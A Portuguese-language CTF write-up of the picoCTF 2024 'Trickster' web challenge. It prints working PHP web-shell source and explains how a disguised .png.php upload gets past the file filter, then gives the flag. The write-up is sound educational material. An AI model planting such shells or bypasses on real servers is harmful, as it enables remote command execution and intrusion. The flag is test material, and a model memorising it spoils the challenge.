# DuckWare Team - Trickster (picoCTF 2024)
###### Solved by @Antonio-alexandre

> This is a CTF about SQL Injection, Web Exploitation

## Desafio: Trickster (Exploração Web)
#### Introdução

Este desafio explora vulnerabilidades em aplicações web. Para esse desafio, é necessário análise de páginas web, inspeção de código-fonte e técnicas de exploração de falhas.

- [Página do desafio](https://play.picoctf.org/practice/challenge/445)

#### Análise Inicial

A princípio, nos deparamos com um botão de iniciar instância. Ao clicar nele, nos deparamos com o seguinte link: 

- [Link da aplicação](http://atlas.picoctf.net:55192/)

E com a seguinte tela:

[![Imagem13.png](https://i.postimg.cc/xdBZPNY4/Imagem13.png)](https://postimg.cc/Mcbt6Tn7)

#### Solução

Para concluir o desafio, utilizaremos uma técnica que permite que seja criado um arquivo que nos permite executar comandos, mascarando a sua extensão. Para isso, é utilizado um arquivo `php` disfarçado com a extensão de imagem (ex: `png.php`). Esse arquivo contém um web shell que nos permite executar comandos direto para o servidor.

No arquivo `php`, utilizaremos o seguinte código:
```
PNG
<html>
<body>
<h2>Web Shell</h2>
<form method="GET">
    <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
<pre>
<?php
    if (isset($_GET['cmd'])) {
        $command = $_GET['cmd'];
        echo shell_exec($command . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Esse código, de maneira resumida, cria uma interface bem simples que permite digitar e enviar comandos para o servidor.

Após criar o arquivo, o salvei com a extensão `.png`.

Após isso, ativei o modo Intercept do Proxy do Burp Suite. Esse modo Intercept nada mais é do que um modo que nos possibilita ver e editar as informações que iremos enviar antes de serem enviadas. Depois, tentei enviar normalmente a imagem para o site. 

Me deparei com a seguinte tela:

[![Imagem14.png](https://i.postimg.cc/J0FHy8jZ/Imagem14.png)](https://postimg.cc/BPxnydYn)

Para enviar como executável `.php`, precisei alterar as seguintes linhas: 
- `filename="webshell.png"` para `filename="webshell.png.php"`
- `image/png` para `application/php`

Após realizar esses passos, precisei digitar `/uploads/webshell.png.php` no final do link.

Ao realizar isso, me deparei com a seguinte tela: 

[![Imagem15.png](https://i.postimg.cc/k5yVQKxn/Imagem15.png)](https://postimg.cc/7CfYDCsc)

Nela, executei o seguinte comando: `find / -name "*.txt"`

O que esse comando faz é basicamente buscar todos os arquivos que possuam `.txt` como extensão.

O terminal então me retornou o seguinte: 

[![Imagem16.png](https://i.postimg.cc/C5Rzp291/Imagem16.png)](https://postimg.cc/m1GbQmLf)

Ao analisar todos os arquivos, encontrei o seguinte arquivo que me chamou bastante atenção:

- `/var/www/html/MFRDAZLDMUYDG.txt`

Após isso, digitei essas informações no terminal, junto com o comando `cat`, ficando assim: `cat /var/www/html/MFRDAZLDMUYDG.txt`

Esse comando basicamente mostra todas as informações escritas em um documento. Nesse caso, como é um .txt ele retornou o que estava escrito.

Por fim, dentro havia a flag do desafio.

>`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}`
 
